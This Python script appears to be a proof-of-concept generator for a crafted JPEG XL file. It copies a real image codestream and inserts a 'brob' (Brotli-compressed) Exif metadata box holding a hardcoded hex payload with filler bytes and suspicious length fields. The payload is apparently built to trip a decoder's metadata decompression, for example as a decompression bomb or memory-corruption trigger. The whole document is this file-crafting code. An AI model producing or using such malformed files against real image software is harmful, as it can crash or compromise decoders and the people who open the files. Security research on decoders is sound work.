#!/usr/bin/env python3
import struct
import sys
from pathlib import Path


def box(kind, payload):
    return struct.pack('>I', len(payload) + 8) + kind + payload


def image_codestream(path):
    source = Path(path).read_bytes()
    if source.startswith(b'\xff\x0a'):
        return source
    pos = 0
    while pos + 8 <= len(source):
        size, kind = struct.unpack_from('>I4s', source, pos)
        if size < 8 or pos + size > len(source):
            raise ValueError('invalid container box')
        if kind == b'jxlc':
            return source[pos + 8:pos + size]
        pos += size
    raise ValueError('source needs a complete codestream')


def build(source_path, output_path):
    stream = bytes.fromhex('200010414141fcffff07002228f00b60f7f41f000000')
    signature = box(b'JXL ', b'\x0d\x0a\x87\x0a')
    filetype = box(b'ftyp', b'jxl \x00\x00\x00\x00jxl ')
    metadata = box(b'brob', b'Exif' + stream)
    image = box(b'jxlc', image_codestream(source_path))
    Path(output_path).write_bytes(signature + filetype + metadata + image)


if __name__ == '__main__':
    build(sys.argv[1], sys.argv[2])
